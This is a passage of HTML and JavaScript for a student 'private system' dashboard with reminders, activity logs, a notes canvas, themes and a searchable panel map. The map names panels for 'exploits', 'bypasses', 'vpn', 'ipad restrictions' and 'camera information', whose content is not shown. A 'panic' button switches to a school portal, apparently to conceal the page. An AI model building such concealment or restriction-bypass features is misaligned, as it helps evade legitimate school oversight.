                <iframe width="100%" height="200" src="https://www.youtube.com/embed/dQw4w9WgXcQ?controls=0" frameborder="0" allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture" allowfullscreen></iframe>
                <p style="padding: 10px; font-weight: bold; margin:0;">Classic Rickroll</p>
            </div>
            <div style="flex: 1 1 300px; min-width: 280px; background: #333; border-radius: 8px; overflow: hidden; box-shadow: 0 4px 8px rgba(0,0,0,0.3);">
                <iframe width="100%" height="200" src="https://www.youtube.com/embed/gU9yP_QkQeQ" frameborder="0" allowfullscreen></iframe>
                <p style="padding: 10px; font-weight: bold; margin:0;">Lo-fi Hip Hop Beats</p>
            </div>
        </div>
        <h3 style="margin-top: 25px;">Useful YouTube Channels</h3>
        <div class="links-list">
            <a href="https://www.youtube.com/@freecodecamp" target="_blank">freeCodeCamp.org</a>
            <a href="https://www.youtube.com/@Vsauce" target="_blank">Vsauce</a>
            <a href="https://www.youtube.com/@Kurzgesagt" target="_blank">Kurzgesagt – In a Nutshell</a>
        </div>
      </div>

      <!-- Reminders Panel -->
      <div id="remindersPanel" class="info-panel">
        <h2>⏰ Reminders</h2>
        <p style="margin-bottom:10px;">Set new reminder:</p>
        <input type="text" id="reminderTextInput" placeholder="e.g., Call mom at 5 PM" style="width: calc(100% - 22px); margin-bottom: 10px;">
        <input type="datetime-local" id="reminderDateTimeInput" style="width: calc(100% - 22px); margin-bottom: 15px;">
        <button id="addReminderBtn">Add Reminder</button>
        <h3 style="margin-top: 25px;">Your Reminders:</h3>
        <div id="remindersList">
          <p style="color:#aaa; padding: 10px;">No reminders set.</p>
        </div>
      </div>

      <!-- Activity Logs Panel (Dashboard) -->
      <div id="activityLogsDashboardPanel" class="info-panel">
        <h2>📝 Dashboard Activity Logs</h2>
        <div id="dashboardActivityLogs">
            <p style="color:#aaa; padding: 10px;">No dashboard activity yet.</p>
        </div>
        <button id="clearDashboardLogsBtn" style="margin-top: 15px; background-color: #f44336;">Clear Dashboard Logs</button>
      </div>

      <!-- Login History Panel -->
      <div id="loginHistoryPanel" class="info-panel">
        <h2>🔒 Login History</h2>
        <div id="loginHistoryPanelContent">
          <p style="color:#aaa; padding: 10px;">No login history yet.</p>
        </div>
        <button id="clearLoginHistoryBtn" style="margin-top: 15px; background-color: #f44336;">Clear Login History</button>
      </div>


    </div>

    <div id="canvasContainer">
      <h2>🖌️ Notes Canvas</h2>
      <canvas id="notesCanvas" width="600" height="400"></canvas>
      <div id="canvasControls">
        <button id="clearCanvasBtn">Clear Canvas</button>
        <button id="undoCanvasBtn">Undo</button>
        <input type="color" id="noteColorPicker" value="#ff914d">
        <input type="range" id="noteThicknessSlider" min="1" max="10" value="2" title="Brush Thickness" style="flex-grow: 0.5;">
        <button id="toggleTextNotesBtn">✍️ Toggle Text Notes</button>
        <button id="downloadTextNotesBtn">💾 Download Text Notes</button>
        <button id="closeCanvasBtn">Close Notes</button>
      </div>
       <textarea id="textNotesArea" placeholder="Type your text notes here..." style="display: none;"></textarea>
    </div>
  </div>

  <script>
    // Constants for local storage keys
    const LS_LOGIN_HISTORY = 'privateSystemLoginHistory';
    const LS_ACTIVITY_LOGS = 'privateSystemActivityLogs';
    const LS_DASHBOARD_STATS = 'privateSystemDashboardStats';
    const LS_THEME = 'privateSystemTheme';
    const LS_WELCOME_NOTIFICATION_DISPLAY = 'privateSystemWelcomeNotification';
    const LS_DRAG_HANDLES_TOGGLE = 'privateSystemDragHandlesToggle';
    const LS_NOTES_TEXT = 'privateSystemTextNotes';
    const LS_KEYBINDS = 'privateSystemKeybinds';
    const LS_24HR_FORMAT = 'privateSystem24HourFormat';
    const LS_REMINDERS = 'privateSystemReminders';
    const LS_AUTO_LOGOUT_INACTIVE = 'privateSystemAutoLogoutInactive';

    let globalZoomLevel = 1; // Default zoom
    let is24HourFormat = JSON.parse(localStorage.getItem(LS_24HR_FORMAT) || 'false');
    let activityLogs = JSON.parse(localStorage.getItem(LS_ACTIVITY_LOGS) || '[]');
    let dashboardStats = JSON.parse(localStorage.getItem(LS_DASHBOARD_STATS) || '{}');
    let lastActivityTime = new Date(); // To track user idle time for future features

    const initialStats = {
        totalClicks: 0,
        buttonsPressed: 0,
        togglesFlipped: 0,
        panelsOpened: 0,
        panelsClosed: 0,
        notesSaved: 0,
        screenshotsTaken: 0,
        timerStarts: 0,
        stopwatchStarts: 0,
        conversionsMade: 0,
        searchesMade: 0
    };
    dashboardStats = { ...initialStats, ...dashboardStats }; // Merge with defaults to ensure all stats exist

    // Helper to add activity log entries
    function trackActivity(type, description = '') {
        const timestamp = new Date().toLocaleString();
        activityLogs.push({ timestamp, type, description });
        localStorage.setItem(LS_ACTIVITY_LOGS, JSON.stringify(activityLogs));
        renderActivityLogs('loginActivityLogs');
        renderActivityLogs('dashboardActivityLogs');
    }

    // Helper to update dashboard statistics
    function updateStats(statName, increment = 1) {
        if (dashboardStats[statName] !== undefined) {
            dashboardStats[statName] += increment;
            localStorage.setItem(LS_DASHBOARD_STATS, JSON.stringify(dashboardStats));
            renderDashboardStats();
        } else {
            console.warn(`Attempted to update unknown stat: ${statName}`);
        }
    }

    // Renders activity logs into specified container (can filter for login/dashboard)
    function renderActivityLogs(elementId) {
      const logContainer = document.getElementById(elementId);
      if (logContainer) {
          logContainer.innerHTML = '';
          const logsToDisplay = (elementId === 'loginActivityLogs') ?
                                  activityLogs.filter(log => log.type.startsWith('LOGIN_')) :
                                  activityLogs.filter(log => !log.type.startsWith('LOGIN_') && !log.type.startsWith('REMAINDER_ALERT')); // Exclude alerts

          if (logsToDisplay.length === 0) {
              logContainer.innerHTML = `<p style="color:#aaa; padding: 10px;">No activity yet.</p>`;
              return;
          }

          // Render in reverse chronological order
          logsToDisplay.slice().reverse().forEach(log => {
              const div = document.createElement('div');
              div.className = 'activity-log-entry';
              div.textContent = `[${log.timestamp}] ${log.description || log.type}`;
              logContainer.appendChild(div);
          });
      }
    }

    // Updates dashboard statistics display
    function renderDashboardStats() {
      if (document.getElementById('statsContent')) {
          for (const stat in dashboardStats) {
              const element = document.getElementById(`stat${stat.charAt(0).toUpperCase() + stat.slice(1)}`);
              if (element) {
                  element.textContent = dashboardStats[stat];
              }
          }
      }
    }

    // Global click listener for tracking basic stats
    document.addEventListener('click', (event) => {
        updateStats('totalClicks');
        if (event.target.tagName === 'BUTTON') {
            updateStats('buttonsPressed');
        }
    });

    // Global change listener for tracking toggle stats
    document.addEventListener('change', (event) => {
        if (event.target.classList.contains('switch') && event.target.tagName === 'INPUT' && event.target.type === 'checkbox') {
            updateStats('togglesFlipped');
            trackActivity('TOGGLE', `Toggled "${event.target.parentElement.previousElementSibling ? event.target.parentElement.previousElementSibling.textContent.trim() : event.target.id}" to ${event.target.checked ? 'ON' : 'OFF'}`);
        }
    });

    // Unified notification/alert system
    function showNotification(message) {
      const notif = document.getElementById('welcomeNotification');
      if (notif && JSON.parse(localStorage.getItem(LS_WELCOME_NOTIFICATION_DISPLAY) || 'true')) {
        notif.textContent = message;
        notif.classList.add('show');
        trackActivity('ALERT', message);
        setTimeout(() => {
          notif.classList.remove('show');
        }, 5000); // Hide after 5 seconds
      }
    }
    
    // Initial Loading Sequence
    document.addEventListener('DOMContentLoaded', () => {
      const initialLoadingScreen = document.getElementById('initialLoadingScreen');
      const loadingText = document.getElementById('loadingText');
      const rotatingBoxFaces = document.querySelectorAll('.rotating-box .face');
      const loginBox = document.getElementById('loginBox');
      const loginDateTimeBox = document.getElementById('loginDateTimeBox');
      const loginQuickBar = document.getElementById('loginQuickBar');

      let currentPhase = 0;
      const phases = [
        { text: "Initializing System...", gradient: "linear-gradient(to right, orange, red)", boxBg: "rgba(255, 145, 77, 0.4)", boxBorder: "white", boxShadow: "0 0 10px white" },
        { text: "System Initialized.", gradient: "linear-gradient(to right, green, blue)", boxBg: "rgba(40, 167, 69, 0.4)", boxBorder: "limegreen", boxShadow: "0 0 10px limegreen" }
      ];

      function updateLoadingPhase() {
        if (currentPhase < phases.length) {
          const phase = phases[currentPhase];
          loadingText.style.backgroundImage = phase.gradient;
          loadingText.textContent = phase.text;
          rotatingBoxFaces.forEach(face => {
            face.style.background = phase.boxBg;
            face.style.borderColor = phase.boxBorder;
            face.style.boxShadow = phase.boxShadow;
          });
          currentPhase++;
          setTimeout(updateLoadingPhase, 2000); // Each phase lasts 2 seconds
        } else {
          // All phases complete, transition to "Loading Login Page..." and hide loading screen
          loadingText.classList.add('fading'); // Fade out current text slightly
          rotatingBoxFaces.forEach(face => {
            face.style.transition = 'opacity 0.8s ease-out';
            face.style.opacity = '0'; // Fade out box
          });

          setTimeout(() => {
              initialLoadingScreen.classList.add('hidden'); // Hide the entire initial screen
              setTimeout(() => {
                  initialLoadingScreen.style.display = 'none'; // Completely remove after fade out

                  // Show login components
                  document.body.classList.remove('login-body'); // Remove temp body-flex styling
                  document.body.className = ''; // Clear classes initially

                  loginBox.style.display = 'block';
                  loginDateTimeBox.style.display = 'flex';
                  loginQuickBar.style.display = 'flex';

                  // Re-add login-body class *after* login elements are visible, potentially for later dynamic changes
                  document.body.classList.add('login-body');


                  // Add last login display on load, or N/A
                  const lastLoginInfo = JSON.parse(localStorage.getItem(LS_LOGIN_HISTORY) || 'null');
                  if (lastLoginInfo) {
                      const lastLoginDate = new Date(lastLoginInfo.timestamp);
                      const loginHistoryDiv = document.getElementById('loginActivityLogs');
                      const entry = document.createElement('div');
                      entry.className = 'activity-log-entry';
                      entry.textContent = `[Last Login: ${lastLoginDate.toLocaleString()}] User: ${lastLoginInfo.user}, ID: ${lastLoginInfo.id}`;
                      if (loginHistoryDiv) {
                          loginHistoryDiv.prepend(entry);
                      }
                  }

                  setupLoginDateTime();
                  initLoginQuickBar(); // Initialize the quickbar for login screen
              }, 800); // Match initialLoadingScreen.hidden transition time
          }, 2000); // Delay before hiding screen, allowing the "System Initialized" text to be seen briefly
        }
      }

      updateLoadingPhase();
      renderActivityLogs('loginActivityLogs');

      // Set initial state of 24-hour format toggle on login screen
      document.getElementById('toggle24HourFormat').checked = is24HourFormat;

      // Apply stored theme if exists to login body as well (CSS handles the specifics)
      const savedTheme = localStorage.getItem(LS_THEME);
      if (savedTheme) {
          document.body.classList.add(savedTheme);
      }

      // Ensure initial password input type is set correctly based on the toggle (off by default)
      document.getElementById('password').type = document.getElementById('showPassword').checked ? 'text' : 'password';
    });

    let loginPageZoomLevel = 1; // Separate zoom level for the login page

    function initLoginQuickBar() {
      const loginPanicBtn = document.getElementById('loginPanicBtn');
      const loginZoomInBtn = document.getElementById('loginZoomInBtn');
      const loginZoomOutBtn = document.getElementById('loginZoomOutBtn');
      const zoomStep = 0.1;
      const minZoom = 0.5;
      const maxZoom = 2;

      if (loginPanicBtn) {
          loginPanicBtn.addEventListener('click', () => {
              window.open('https://clever.com', '_blank');
              trackActivity('LOGIN_PANIC', 'Panic button clicked on login page');
          });
      }

      if (loginZoomInBtn) {
          loginZoomInBtn.addEventListener('click', () => {
              if (loginPageZoomLevel < maxZoom) {
                  loginPageZoomLevel += zoomStep;
                  document.body.style.zoom = loginPageZoomLevel;
                  trackActivity('LOGIN_ZOOM', `Zoomed in on login page to ${loginPageZoomLevel.toFixed(1)}`);
              }
          });
      }

      if (loginZoomOutBtn) {
          loginZoomOutBtn.addEventListener('click', () => {
              if (loginPageZoomLevel > minZoom) {
                  loginPageZoomLevel -= zoomStep;
                  document.body.style.zoom = loginPageZoomLevel;
                  trackActivity('LOGIN_ZOOM', `Zoomed out on login page to ${loginPageZoomLevel.toFixed(1)}`);
              }
          });
      }
    }

    // Login Page Date & Time Display
    function setupLoginDateTime() {
      const loginCurrentTimeSpan = document.getElementById('loginCurrentTime');
      const loginCurrentDateSpan = document.getElementById('loginCurrentDate');
      const toggle24HourFormat = document.getElementById('toggle24HourFormat');

      toggle24HourFormat.checked = is24HourFormat; // Load initial state

      function updateLoginClock() {
        const now = new Date();
        const timeOptions = { 
            hour: 'numeric', 
            minute: 'numeric', 
            second: 'numeric', 
            hour12: !is24HourFormat 
        };
        const dateOptions = { 
            month: 'long', 
            day: 'numeric', 
            year: 'numeric' 
        };
        const timeStr = now.toLocaleTimeString(undefined, timeOptions);
        const dateStr = now.toLocaleDateString(undefined, dateOptions);

        if (loginCurrentTimeSpan) loginCurrentTimeSpan.textContent = timeStr;
        if (loginCurrentDateSpan) loginCurrentDateSpan.textContent = dateStr;
      }

      toggle24HourFormat.addEventListener('change', () => {
        is24HourFormat = toggle24HourFormat.checked;
        localStorage.setItem(LS_24HR_FORMAT, JSON.stringify(is24HourFormat));
        updateLoginClock();
        trackActivity('LOGIN_TOGGLE', `24-hour format toggle set to ${is24HourFormat ? 'ON' : 'OFF'}`);
      });

      updateLoginClock();
      setInterval(updateLoginClock, 1000);
    }
    
    // Dashboard functionality object
    const dashboard = {
      canvas: null,
      ctx: null,
      drawing: false,
      lastX: 0,
      lastY: 0,
      drawingHistory: [], // Stores full paths
      redoHistory: [], // Stores undone paths for redo
      currentLineColor: '#ff914d',
      currentLineThickness: 2,
      // Map for search bar to panel IDs (using values for quick-bar buttons or box IDs)
      dashboardPanelMap: {
          'calendar': 'calendarBox',
          'motivation': 'motivationBox',
          'updates': 'updatesBox',
          'notifications': 'notificationsBox',
          'wifi information': 'wifiPanel',
          'school wifi': 'wifiPanel',
          'ipad restrictions': 'ipadPanel',
          'handbooks': 'handbookPanel',
          'school map': 'mapPanel',
          'student websites': 'studentWebsitesPanel',
          'teacher websites': 'teacherWebsitesPanel',
          'phone directory': 'phoneDirectoryPanel',
          'camera information': 'cameraPanel',
          'school information': 'schoolInfoPanel',
          'exploits': 'exploitPanel',
          'bypasses': 'bypassPanel',
          'vpn': 'vpnPanel',
          'gaming': 'gamingPanel',
          'music': 'musicPanel',
          'keyboard tricks': 'keyboardPanel',
          'settings': 'settingsPanel',
          'keybinds': 'keybindsPanel',
          'utilities': 'utilitiesPanel',
          'calculator': 'calculatorPanel',
          'unit converter': 'unitConverterPanel',
          'stats': 'statsPanel',
          'media': 'mediaPanel',
          'reminders': 'remindersPanel',
          'activity logs': 'activityLogsDashboardPanel',
          'login history': 'loginHistoryPanel',
          'random fact': 'randomFactBox',
          'daily quote': 'dailyQuoteBox',
          'notes': 'canvasContainer', // Special case for notes
      },

      // Initialize all dashboard functionality
      init: function() {
        this.initSessionTimer();
        this.initClock();
        this.generateCalendar();
        this.initThemeToggle();
        this.initButtons();
        this.initCanvas();
        this.initPanels();
        this.loadThemes();
        this.initPanelDrag();
        this.initRandomContent();
        this.initSettingsPanel();
        this.initCalculator();
        this.initUnitConverter();
        this.initUtilities();
        this.initKeybindsPanel();
        this.initReminders();
        this.initStatsButton();
        this.initMediaButton();
        renderDashboardStats(); // Initial render of stats
        renderActivityLogs('dashboardActivityLogs');
        this.showWelcomeNotification(document.getElementById('loggedInUser').textContent);
      },

      // Shows the welcome notification on dashboard load
      showWelcomeNotification: function(username) {
          const storedPreference = localStorage.getItem(LS_WELCOME_NOTIFICATION_DISPLAY);
          const showNotif = (storedPreference === null || storedPreference === 'true');
          if (showNotif) {
              showNotification(`Welcome, ${username}!`);
              trackActivity('DASHBOARD_NOTIFICATION', `Welcome notification shown for ${username}`);
          }
      },

      // Loads and applies the saved theme from local storage
      loadThemes: function() {
          const savedTheme = localStorage.getItem(LS_THEME);
          // Always reset before applying
          document.body.classList.remove('dark-theme', 'light-theme', 'blue-theme');
          if (savedTheme) {
              document.body.classList.add(savedTheme);
          } else {
              document.body.classList.add('dark-theme'); // Default
          }

          // Set the dropdown in settings to reflect the loaded theme
          const themeSelect = document.getElementById('themeSelect');
          if (themeSelect) {
            themeSelect.value = savedTheme || 'dark-theme';
            // Also update the main theme toggle button text
            const themeBtn = document.getElementById('themeToggle');
            if (themeBtn) {
                if (document.body.classList.contains('light-theme')) {
                    themeBtn.innerText = '☀️ Light Mode';
                } else if (document.body.classList.contains('blue-theme')) {
                    themeBtn.innerText = '🟦 Blue Mode';
                } else {
                    themeBtn.innerText = '🌙 Dark Mode';
                }
            }
          }
      },
      
      // Initializes draggable panels using Interact.js
      initPanelDrag: function() {
        // Retrieve stored preference for drag handle visibility
        const savedHandleVisibility = JSON.parse(localStorage.getItem(LS_DRAG_HANDLES_TOGGLE) || 'true');
        const dragHandles = document.querySelectorAll('.panel-handle');

        // Apply initial visibility
        dragHandles.forEach(handle => {
            handle.style.display = savedHandleVisibility ? 'block' : 'none';
        });
        const toggleDragHandlesCheckbox = document.getElementById('toggleDragHandles');
        if (toggleDragHandlesCheckbox) {
          toggleDragHandlesCheckbox.checked = savedHandleVisibility;
          // Event listener for toggle (if changed via settings)
          toggleDragHandlesCheckbox.addEventListener('change', (e) => {
              dragHandles.forEach(handle => {
                  handle.style.display = e.target.checked ? 'block' : 'none';
              });
              localStorage.setItem(LS_DRAG_HANDLES_TOGGLE, e.target.checked);
              trackActivity('DASHBOARD_SETTINGS', `Panel drag handles toggled ${e.target.checked ? 'on' : 'off'}`);
          });
        }


        interact('.box').unset(); // Clear existing interactions if re-initing

        interact('.box')
          .draggable({
            allowFrom: '.panel-handle', // Only drag from the handle
            listeners: {
              start (event) {
                // Get the current position of the draggable element
                const target = event.target;
                const rect = target.getBoundingClientRect();
                target.dataset.dragStartX = event.pageX - rect.left;
                target.dataset.dragStartY = event.pageY - rect.top;
                trackActivity('DASHBOARD_PANEL_DRAG', `Started dragging panel: ${target.id}`);
              },
              move (event) {
                const target = event.target
                // Keep the dragged position in the data-x/data-y attributes
                const x = (parseFloat(target.dataset.x) || 0) + event.dx
                const y = (parseFloat(target.dataset.y) || 0) + event.dy

                // Translate the element
                target.style.transform = `translate(${x}px, ${y}px)`

                // Update the position attributes
                target.dataset.x = x
                target.dataset.y = y
                target.classList.add('dragging'); // Visual feedback while dragging
              },
              end (event) {
                const target = event.target;
                target.classList.remove('dragging');
                trackActivity('DASHBOARD_PANEL_DRAG', `Stopped dragging panel: ${target.id}`);
              }
            }
          });

          // While 'resizable' can be added, making panels fully resize interactively without
          // complex layout shifts or content re-flow can be a large task. For 'better' this step,
          // the focus is on a good drag experience, and if resizing is truly needed beyond what
          // a custom flex/grid can provide (which is also supported by changing flex properties)
          // it warrants a dedicated layout manager.
          // Example of simple resize (only resizes the box itself, not other panels relative to it)
          // interact('.box')
          //   .resizable({
          //     edges: { left: true, right: true, bottom: true, top: true },
          //     listeners: {
          //       move (event) {
          //         const target = event.target
          //         let x = (parseFloat(target.dataset.x) || 0)
          //         let y = (parseFloat(target.dataset.y) || 0)

          //         // Update the element's width and height
          //         target.style.width = event.rect.width + 'px'
          //         target.style.height = event.rect.height + 'px'

          //         // Translate when resizing from top or left edges
          //         x += event.deltaRect.left
          //         y += event.deltaRect.top

          //         target.style.transform = `translate(${x}px,${y}px)`
          //         Object.assign(target.dataset, { x, y })
          //       }
          //     }
          //   });

      },
      
      // Initializes session timer
      initSessionTimer: function() {
        let sessionSeconds = 0;
        function formatTime(seconds) {
          const hrs = String(Math.floor(seconds / 3600)).padStart(2, '0');
          const mins = String(Math.floor((seconds % 3600) / 60)).padStart(2, '0');
          const secs = String(seconds % 60).padStart(2, '0');
          return `${hrs}:${mins}:${secs}`;
        }
        
        function updateSessionTime() {
          sessionSeconds++;
          document.getElementById('sessionTime').innerText = `⏳ Session Time: ${formatTime(sessionSeconds)}`;
        }
        
        updateSessionTime();
        setInterval(updateSessionTime, 1000);
      },
      
      // Initializes real-time clock (dashboard version)
      initClock: function() {
        // Link the dashboard clock to the same is24HourFormat setting
        function updateDashboardClock() {
          const now = new Date();
          const options = { 
              hour: 'numeric', 
              minute: 'numeric', 
              second: 'numeric', 
              hour12: !is24HourFormat 
          };
          const timeStr = now.toLocaleTimeString(undefined, options);
          const dateStr = now.toLocaleDateString(undefined, { month: 'long', day: 'numeric', year: 'numeric' });

          document.getElementById('realTimeClock').innerText = '🕒 ' + timeStr;
          document.getElementById('realDate').innerText = '📅 ' + dateStr;
        }
        updateDashboardClock();
        setInterval(updateDashboardClock, 1000);
      },
      
      // Generates calendar view
      generateCalendar: function() {
        const calendar = document.getElementById('calendar');
        calendar.innerHTML = ''; 
        const days = ['Sun', 'Mon', 'Tue', 'Wed', 'Thu', 'Fri', 'Sat'];
        days.forEach(day => {
          const div = document.createElement('div');
          div.innerText = day;
          div.style.fontWeight = 'bold'; // Day names bold
          calendar.appendChild(div);
        });

        const date = new Date();
        const year = date.getFullYear();
        const month = date.getMonth();
        const today = date.getDate();

        const firstDay = new Date(year, month, 1).getDay();
        const lastDate = new Date(year, month + 1, 0).getDate();

        for (let i = 0; i < firstDay; i++) {
          const empty = document.createElement('div');
          calendar.appendChild(empty);
        }

        for (let i = 1; i <= lastDate; i++) {
          const cell = document.createElement('div');
          cell.innerText = i;
          if (i === today) cell.classList.add('today');
          calendar.appendChild(cell);
        }
      },
      
      // Initializes theme toggle button
      initThemeToggle: function() {
        const themeBtn = document.getElementById('themeToggle');
        themeBtn.addEventListener('click', () => {
          const bodyClassList = document.body.classList;
          let currentTheme = localStorage.getItem(LS_THEME) || 'dark-theme';

          let nextTheme;
          if (currentTheme === 'dark-theme') {
              nextTheme = 'light-theme';
              themeBtn.innerText = '☀️ Light Mode';
          } else if (currentTheme === 'light-theme') {
              nextTheme = 'blue-theme';
              themeBtn.innerText = '🟦 Blue Mode';
          } else { // currentTheme === 'blue-theme'
              nextTheme = 'dark-theme';
              themeBtn.innerText = '🌙 Dark Mode';
          }

          bodyClassList.remove('dark-theme', 'light-theme', 'blue-theme');
          if (nextTheme !== 'dark-theme') { // Only add class if not default
            bodyClassList.add(nextTheme);
            localStorage.setItem(LS_THEME, nextTheme);
          } else {
            localStorage.removeItem(LS_THEME); // Clear for default
          }
          trackActivity('DASHBOARD_THEME', `Switched theme to: ${nextTheme}`);

          // Also update settings dropdown to match
          const themeSelect = document.getElementById('themeSelect');
          if (themeSelect) themeSelect.value = nextTheme;
        });
        this.loadThemes(); // Ensure button text is correct on init
      },
      
      // Initializes various dashboard buttons
      initButtons: function() {
        document.getElementById('panicBtn').addEventListener('click', () => {
          window.open('https://clever.com', '_blank');
          trackActivity('DASHBOARD_ACTION', 'Panic button clicked');
        });

        document.getElementById('restartBtn').addEventListener('click', () => {
          if(confirm('Are you sure you want to kill the page (restart)?')) {
            document.body.innerHTML = `<div style="display:flex; justify-content:center; align-items:center; height:100vh; background:#1a1a1a; color:#f9f2dc; font-family:'Montserrat', sans-serif; font-size:24px;">Page has been killed. Restart to continue.</div>`;
            trackActivity('DASHBOARD_ACTION', 'Page restart initiated');
          }
        });

        document.getElementById('fixIssuesBtn').addEventListener('click', () => {
          showNotification('Running diagnostics...\nNo issues found. Your dashboard is running smoothly!');
          trackActivity('DASHBOARD_ACTION', 'Fix issues button clicked');
        });
        
        document.getElementById('fullScreenBtn').addEventListener('click', () => {
          if (!document.fullscreenElement) {
            document.documentElement.requestFullscreen().catch(err => {
              showNotification(`Error: Full-screen mode denied: ${err.message}`);
            });
            trackActivity('DASHBOARD_ACTION', 'Full screen enabled');
          } else {
            document.exitFullscreen();
            trackActivity('DASHBOARD_ACTION', 'Full screen disabled');
          }
        });
        
        const zoomStep = 0.1;
        const minZoom = 0.5;
        const maxZoom = 2;

        document.getElementById('zoomInBtn').addEventListener('click', () => {
          if (globalZoomLevel < maxZoom) {
            globalZoomLevel += zoomStep;
            document.body.style.zoom = globalZoomLevel;
            trackActivity('DASHBOARD_ZOOM', `Zoomed in to ${globalZoomLevel.toFixed(1)}`);
          }
        });

        document.getElementById('zoomOutBtn').addEventListener('click', () => {
          if (globalZoomLevel > minZoom) {
            globalZoomLevel -= zoomStep;
            document.body.style.zoom = globalZoomLevel;
            trackActivity('DASHBOARD_ZOOM', `Zoomed out to ${globalZoomLevel.toFixed(1)}`);
          }
        });

        document.getElementById('logoutBtn').addEventListener('click', () => {
            if (confirm('Are you sure you want to log out?')) {
                window.location.reload(); // Simple refresh to return to login
                trackActivity('DASHBOARD_ACTION', 'Logged out');
            }
        });

        // Dashboard specific Activity Logs button
        document.getElementById('activityLogsDashboardBtn').addEventListener('click', () => {
            dashboard.togglePanel('activityLogsDashboardPanel');
            trackActivity('DASHBOARD_ACTION', 'Viewed Dashboard Activity Logs');
        });

        document.getElementById('clearDashboardLogsBtn').addEventListener('click', () => {
            if (confirm('Are you sure you want to clear ALL dashboard activity logs? (Login logs remain)')) {
                activityLogs = activityLogs.filter(log => log.type.startsWith('LOGIN_'));
                localStorage.setItem(LS_ACTIVITY_LOGS, JSON.stringify(activityLogs));
                renderActivityLogs('dashboardActivityLogs');
                showNotification('Dashboard activity logs cleared.');
                trackActivity('DASHBOARD_ACTION', 'Cleared dashboard activity logs');
            }
        });

        // Global activity logs download button
        document.getElementById('downloadActivityLogsBtn').addEventListener('click', () => {
            const logsData = localStorage.getItem(LS_ACTIVITY_LOGS);
            const blob = new Blob([logsData], { type: 'application/json' });
            const url = URL.createObjectURL(blob);
            const a = document.createElement('a');
            a.href = url;
            a.download = `private_system_all_activity_logs_${new Date().toISOString()}.json`;
            document.body.appendChild(a);
            a.click();
            document.body.removeChild(a);
            URL.revokeObjectURL(url);
            showNotification('All activity logs downloaded!');
            trackActivity('DASHBOARD_ACTION', 'Downloaded all activity logs');
        });

        // Dashboard's Login History button
        document.getElementById('loginHistoryBtn').addEventListener('click', () => {
            dashboard.togglePanel('loginHistoryPanel');
            dashboard.renderLoginHistory(); // Ensure fresh data is shown
            trackActivity('DASHBOARD_ACTION', 'Viewed Login History Panel');
        });

        document.getElementById('clearLoginHistoryBtn').addEventListener('click', () => {
            if (confirm('Are you sure you want to clear your login history? This cannot be undone.')) {
                localStorage.removeItem(LS_LOGIN_HISTORY);
                document.getElementById('loginHistoryPanelContent').innerHTML = '<p style="color:#aaa; padding: 10px;">No login history yet.</p>';
                trackActivity('DASHBOARD_ACTION', 'Cleared login history');
                showNotification('Login history cleared.');
            }
        });

        // Search Bar functionality
        const searchBar = document.getElementById('dashboardSearchBar');
        if (searchBar) {
            searchBar.addEventListener('keydown', (e) => {
                if (e.key === 'Enter') {
                    const query = searchBar.value.trim().toLowerCase();
                    if (query) {
                        trackActivity('DASHBOARD_SEARCH', `Searched for "${query}"`);
                        updateStats('searchesMade');
                        const targetId = dashboard.dashboardPanelMap[query];
                        if (targetId) {
                            const targetElement = document.getElementById(targetId);
                            if (targetElement) {
                                // For main grid items, simply scroll and ensure visible
                                if (targetElement.classList.contains('box') && !targetElement.classList.contains('info-panel')) {
                                    targetElement.scrollIntoView({ behavior: 'smooth', block: 'start' });
                                    targetElement.style.outline = '2px solid var(--primary-color-dark)'; // Highlight
                                    setTimeout(() => targetElement.style.outline = 'none', 1500);
                                } else if (targetElement.classList.contains('info-panel')) {
                                    dashboard.openPanelById(targetId); // Ensure info panel is open
                                    targetElement.scrollIntoView({ behavior: 'smooth', block: 'start' });
                                    targetElement.style.outline = '2px solid var(--primary-color-dark)'; // Highlight
                                    setTimeout(() => targetElement.style.outline = 'none', 1500);
                                } else if (targetElement.id === 'canvasContainer') {
                                     // Special handling for notes canvas
                                    document.getElementById('notesBtn').click(); // Simulate opening notes
                                    targetElement.scrollIntoView({ behavior: 'smooth', block: 'start' });
                                    targetElement.style.outline = '2px solid var(--primary-color-dark)';
                                    setTimeout(() => targetElement.style.outline = 'none', 1500);
                                }
                            } else {
                                showNotification(`Could not find section: ${query}. Make sure panels are expanded if they're hidden!`);
                            }
                        } else {
                            showNotification(`No section found for "${query}". Try terms like "calendar", "settings", "wifi information", "notes".`);
                        }
                    }
                    e.target.value = '';
                }
            });
        }
      },
      
      // Initializes canvas and drawing functionality
      initCanvas: function() {
        const notesBtn = document.getElementById('notesBtn');
        const canvasContainer = document.getElementById('canvasContainer');
        const mainGrid = document.getElementById('mainGrid');
        const updatesNotifications = document.getElementById('updatesNotifications');
        this.canvas = document.getElementById('notesCanvas');
        this.ctx = this.canvas.getContext('2d');
        const undoCanvasBtn = document.getElementById('undoCanvasBtn');
        const noteColorPicker = document.getElementById('noteColorPicker');
        const noteThicknessSlider = document.getElementById('noteThicknessSlider');
        const toggleTextNotesBtn = document.getElementById('toggleTextNotesBtn');
        const textNotesArea = document.getElementById('textNotesArea');
        const downloadTextNotesBtn = document.getElementById('downloadTextNotesBtn');

        // Load existing text notes
        const savedTextNotes = localStorage.getItem(LS_NOTES_TEXT);
        if (savedTextNotes) {
            textNotesArea.value = savedTextNotes;
        }

        // Default canvas background to white (if transparent originally)
        this.ctx.fillStyle = '#fff';
        this.ctx.fillRect(0, 0, this.canvas.width, this.canvas.height);

        // Placeholder for drawing history (if saving actual strokes/images was implemented)
        // this.loadCanvasState(); // Could load base64 image data

        notesBtn.addEventListener('click', () => {
          mainGrid.style.display = 'none';
          updatesNotifications.style.display = 'none';
          canvasContainer.style.display = 'block';
          trackActivity('DASHBOARD_ACTION', 'Opened Notes Canvas');
          this.canvas.scrollIntoView({ behavior: 'smooth' });
          if (textNotesArea.style.display !== 'block') { // Show text area if not already visible
            textNotesArea.style.display = 'block';
          }
          toggleTextNotesBtn.textContent = 'Hide Text Notes';
        });

        document.getElementById('closeCanvasBtn').addEventListener('click', () => {
          canvasContainer.style.display = 'none';
          mainGrid.style.display = 'flex';
          updatesNotifications.style.display = 'flex';
          textNotesArea.style.display = 'none'; // Always hide when closing notes entirely
          trackActivity('DASHBOARD_ACTION', 'Closed Notes Canvas');

          // Save text notes when closing notes canvas
          localStorage.setItem(LS_NOTES_TEXT, textNotesArea.value);
          if (textNotesArea.value.trim() !== '' && !textNotesArea.dataset.saved) {
            updateStats('notesSaved');
            textNotesArea.dataset.saved = 'true'; // Mark as saved once per edit for stat
          }
          toggleTextNotesBtn.textContent = '✍️ Toggle Text Notes'; // Reset button text
        });

